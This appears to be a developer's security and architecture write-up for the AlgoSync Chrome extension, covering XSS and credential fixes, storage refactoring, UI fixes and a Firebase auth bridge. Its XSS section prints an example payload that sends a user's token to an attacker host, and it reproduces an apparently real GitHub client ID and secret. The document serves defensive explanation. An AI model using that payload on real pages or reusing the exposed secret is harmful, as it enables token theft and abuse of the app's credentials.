# AlgoSync Architecture & Security Deep-Dive

This document serves as a master reference guide for the AlgoSync extension. It explains the critical security flaws found in the original codebase, details the architectural decisions made during the rewrite, and provides a learning path for mastering Chrome Extension development with Firebase.

---

## 📑 Table of Contents
- [Part 1: Security Vulnerabilities & Fixes](#part-1-security-vulnerabilities--fixes)
  - [1. Cross-Site Scripting (XSS) via `innerHTML`](#1-cross-site-scripting-xss-via-innerhtml)
  - [2. Exposed GitHub Client Secret](#2-exposed-github-client-secret)
  - [3. Fragile DOM Scraping](#3-fragile-dom-scraping)
  - [4. API Rate Limits & Error Handling](#4-api-rate-limits--error-handling)
- [Part 2: Architectural Decisions](#part-2-architectural-decisions)
  - [1. Chrome Identity API vs. Firebase Auth Popup](#1-chrome-identity-api-vs-firebase-auth-popup)
- [Part 3: Learning Path & Resources](#part-3-learning-path--resources)
  - [1. Core Concepts to Master](#1-core-concepts-to-master)
  - [2. Recommended Video Resources](#2-recommended-video-resources)

---

## Part 1: Security Vulnerabilities & Fixes

### 1. Cross-Site Scripting (XSS) via `innerHTML`

> [!CAUTION]
> Using `innerHTML` with unsanitized data is the leading cause of Cross-Site Scripting (XSS) attacks in web development.

#### The Vulnerability
In the original `popup.js`, raw text from LeetCode or GitHub was injected directly into the DOM using template strings:
```javascript
const rawName = item.name; 
html += `<span class="solved-item-title" title="${rawName}">${rawName}</span>`;
solvedListElement.innerHTML = html;
```

#### The Attack Approach
The `innerHTML` property forces the browser to parse strings as actual executable HTML code. If an attacker maliciously names a LeetCode list or problem `<img src="x" onerror="fetch('https://hacker.com?token=' + localStorage.getItem('token'))">`, the browser will blindly execute that JavaScript when the popup opens. The hacker could instantly steal the user's GitHub Access Token.

#### The Implemented Solution
We completely removed all instances of `innerHTML` from `popup.js` and replaced them with secure **DOM Node APIs**:
```javascript
const titleSpan = document.createElement('span');
titleSpan.className = 'solved-item-title';
// textContent strictly renders text, neutralizing any malicious HTML tags
titleSpan.textContent = rawName; 
detailsDiv.appendChild(titleSpan);
```

### 2. Exposed GitHub Client Secret

> [!IMPORTANT]
> Chrome Extensions are fully public client applications. They have no secure backend by default.

#### The Vulnerability
The original `background.js` contained hardcoded API credentials:
```javascript
const GITHUB_CLIENT_ID = 'Ov23lien2nepUiHUGdRA';
const GITHUB_CLIENT_SECRET = '2c59fb5edd693c54037bf64d370b299d6e7db6cf';
```

#### The Attack Approach
Anyone can open their local file explorer, read the extension's source code, and extract the `GITHUB_CLIENT_SECRET`. With this secret, an attacker could spoof the AlgoSync app, drain its rate limits, or trick users into granting permissions to a malicious clone app.

#### The Implemented Solution
We completely stripped the Client Secret and the old OAuth flow from the extension. Instead, we implemented **Firebase Authentication**. The secret is now locked securely inside the Firebase Cloud Console backend, invisible to the public. The extension only talks to Firebase, which handles the secure GitHub handshake.

### 3. Fragile DOM Scraping

#### The Vulnerability
In `content-script.js`, data was extracted using highly specific, machine-generated CSS classes (e.g., `document.querySelector('.problems_header_content__S_W_K h3')`).

#### The Problem
Modern web frameworks auto-generate these class names upon every new site deployment. When LeetCode updates their site, the class name changes, causing the `querySelector` to return `null` and instantly breaking the extension for all users.

#### The Implemented Solution
We transitioned to robust DOM traversal (looking for standard HTML elements like `<h1>` or `a[href]`) and multi-fallback selectors.

### 4. API Rate Limits & Error Handling

> [!TIP]
> Always assume external APIs will fail or rate-limit your users.

#### The Vulnerability
GitHub strictly limits API requests. If a user synced too fast, GitHub would return a `429 Too Many Requests` or `403 Forbidden` error. The old code caught these errors but suppressed them, leaving the user with a generic "Failed" message and no idea what went wrong.

#### The Implemented Solution
We added robust `response.status` checking in `background.js`. If a rate limit is hit, we use the `chrome.notifications` API to display a friendly system popup: *"GitHub rate limit exceeded. Please wait 5 minutes."*

### 5. Extension Storage Limits & Namespacing Refactor

> [!IMPORTANT]
> Storing secure OAuth tokens requires localized sandboxing (`chrome.storage.local`) instead of Google cloud-synced storage (`chrome.storage.sync`) to prevent cross-device session leaks.

#### The Vulnerability & Messy State
In the old layout, extension configurations and credentials (`accessToken`, `selectedRepo`, `repos`, `theme`) were stored flat on `chrome.storage.sync`. This presented two severe issues:
1. **Security Risk**: Storing GitHub tokens on Google's cloud storage sync channels syncs private access tokens across devices, widening the attack surface.
2. **Visual Mess**: Inspections in DevTools showed cluttered, scattered key-value listings, offering zero structure or clean namespacing.

#### The Implemented Solution
We completely overhauled the storage layer by introducing a unified helper engine: [storage-helper.js](file:///d:/abhay%20varshit%20570/Abhay%20Projects/AlgoSync/storage-helper.js):
* **Namespaced `user` Object (`storage.local`)**: Houses secure token details, repository configurations, and lists, keeping them completely localized on the device.
* **Namespaced `settings` Object (`storage.sync`)**: Syncs non-sensitive preferences (like UI `theme`) across the user's Google accounts.
* **Silent Auto-Migration**: Added an automated migration routine on startup (`AlgoStorage.migrate()`) that silently transfers existing flat keys to namespaced variables, keeping all existing users securely logged in with zero disruption.

### 6. Runtime Dependency Failures in Popup

#### The Problem
We discovered that [popup.js](file:///d:/abhay%20varshit%20570/Abhay%20Projects/AlgoSync/popup.js) made immediate async calls to `AlgoStorage` upon initialization. However, [popup.html](file:///d:/abhay%20varshit%20570/Abhay%20Projects/AlgoSync/popup.html) only imported `firestore-helper.js` and `popup.js`, leaving `storage-helper.js` unreferenced. This triggered immediate, uncaught runtime script crashes (`AlgoStorage is not defined`) when a user opened the extension popup.

#### The Implemented Solution
We integrated the `<script src="storage-helper.js"></script>` tag directly before `firestore-helper.js` in `popup.html`, establishing a solid dependency order and securing popup UI stability.

### 7. Overlapping Nav Elements on High Viewport Zoom

#### The Problem
With fixed `10%` padding on the main `<nav>` bar and hardcoded `992px` media query collapse margins, the AlgoSync logo, navbar list links, and download CTA buttons collided and overlapped whenever users zoomed their Chrome browsers in (125%–175%), making the navbar unreadable.

#### The Implemented Solution
We replaced all rigid layouts with fluid design rules in [index.html](file:///d:/abhay%20varshit%20570/Abhay%20Projects/AlgoSync/website/index.html):
* **Fluid padding boundaries**: Updated nav padding to `padding: 1rem max(2rem, 5vw)`.
* **Preventing Element Collisions**: Added custom fluid gap adjustments at `@media (max-width: 1250px)` and `@media (max-width: 1150px)`.
* **Earlier Mobile Hamburger Collapse**: Shifted the mobile navigation query to hide nav links at `1024px` instead of `992px`, keeping the logo and CTAs clean at any zoom level.

### 8. Static Placeholder Mockups & Action Redirects

#### The Problem
The landing page hero section featured a generic stock picture of a laptop showing PHPStorm editor code that did not align with AlgoSync. Additionally, the primary "Install" buttons had empty hashes (`href="#"`) leading to dead clicks and poor onboarding UX.

#### The Implemented Solution
* **Stock Photo Cleanup**: Deleted the generic mockup container completely, immediately sharpening the hero layout focus.
* **Redirect CTA**: Wired the primary hero `"Add to Chrome — It's Free"` button to point directly to the step-by-step Chrome Extension manual installation guide (`#how-it-works`) for a seamless onboarding loop.

### 9. Portrait Caching Latency

#### The Problem
Aggressive browser caching in Google Chrome caused the old developer profile placeholder avatar to persist on screen even after the user uploaded their own custom black-and-white portrait.

#### The Implemented Solution
We copied the fresh profile image locally into the website bundle as `developer.png` and appended a cache-busting version query string (`/developer.png?v=1`) to all image tags, forcing Chrome to immediately reload and render the latest image asset.

---

## Part 2: Architectural Decisions

### 1. Chrome Identity API vs. Firebase Auth Popup

#### The Challenge
To authenticate users via GitHub, we had to choose between Chrome's native OAuth API (`chrome.identity.launchWebAuthFlow`) and Firebase's SDK method (`signInWithPopup`).

#### Why We Avoided the Native Identity API
If we used the native `chrome.identity` API, Chrome would automatically redirect the user to a virtual domain (e.g., `https://[EXTENSION_ID].chromiumapp.org/`) and grant us the raw GitHub Access Token. 

However, Firebase **would not know who this user is**. To log the user into Firebase using a raw GitHub token, we would have had to build, host, and maintain a custom backend Node.js server to securely mint custom Firebase JWT tokens. This adds massive complexity and hosting costs.

#### The Solution We Implemented: The Firebase Hosting Bridge
We completely bypassed Chrome's Manifest V3 CSP constraints by hosting the authentication flow entirely on the open web using **Firebase Hosting** (`login.html`).

1. **The Bridge Tab:** When the user clicks "Connect GitHub" in the extension popup, we use `chrome.tabs.create()` to open `https://algosync-a537d.web.app/login.html`.
2. **CSP Freedom:** Because `login.html` runs as a standard webpage (not inside the restricted `chrome-extension://` context), it has full freedom to execute Firebase Auth's invisible iframes and Google OAuth redirects without Content Security Policy violations.
3. **The Popup-Blocked Fix:** We bind the `signInWithPopup` trigger directly and synchronously to the user's "Proceed to GitHub" button click on the webpage. This prevents browsers from interpreting the popup as an unprompted, malicious ad popup.
4. **Token Extraction:** For Firebase v8 Compat scripts, the OAuth token is deeply nested. We extract it securely via `result.credential.accessToken`.
5. **Extension Communication:** Once the web page obtains the token, it securely beams it back to the background service worker using `chrome.runtime.sendMessage({ action: 'login_success', token })` combined with `externally_connectable` permissions in `manifest.json`.

#### 5. Beating the Firebase CDN Cache
**The Vulnerability:** Chrome extensions and Firebase Hosting aggressively cache static assets. When we shipped fixes to `login.js`, users' browsers continued executing the broken, cached code.
**The Fix:** We implemented two layers of Cache Busting:
1. `login.html?extId=...&v=1734919192` (Appended dynamic Date timestamps in `popup.js` when creating the tab).
2. `<script src="login.js?v=3"></script>` (Hardcoded query parameter bumping inside the HTML to force the Firebase CDN to serve the latest script).

---

## Part 3: Learning Path & Resources

To successfully maintain this extension, you must understand the intersection of **Manifest V3**, **Firebase**, and **OAuth**.

### 1. Core Concepts to Master

*   **Extension Architecture:** Differentiate between the Popup (resets on close), the Background Service Worker (runs persistently without DOM access), and Content Scripts (injects into web pages).
*   **Message Passing:** Master `chrome.runtime.sendMessage()`. This is how your UI components ask the background worker to execute Firebase functions or GitHub API calls.
*   **Firebase SDK in MV3:** Because Manifest V3 blocks remote CDN scripts (`<script src="https://...">`), you must rely on local SDK files (the `compat` libraries we added) or use a JavaScript bundler.
*   **Firestore NoSQL Modeling:** Understand how data is stored in Collections and Documents, and learn how to write Firestore Security Rules to prevent User A from reading User B's data.

### 2. Recommended Video Resources

Because Manifest V3 drastically changed Chrome Extension development, avoid tutorials older than 2023, as they will likely use deprecated Manifest V2 patterns.

*   **"How to add Firebase to a Service Worker - Chrome Extension Manifest Version MV3"**
    *   *Creator:* Russell Barnard (Rusty Extensions)
    *   *Focus:* Watch how he handles downloading the modular Firebase SDK locally and why Manifest V3 blocks external scripts.
*   **"Implementing Firebase Auth SSO with Chrome Extensions MV3"**
    *   *Search Term:* `Firebase Auth chrome.identity Manifest V3 tutorial`
    *   *Focus:* Watch how modern bundlers (Vite/Webpack) are used to compile Firebase into a single `background.js` file for production-level extensions.
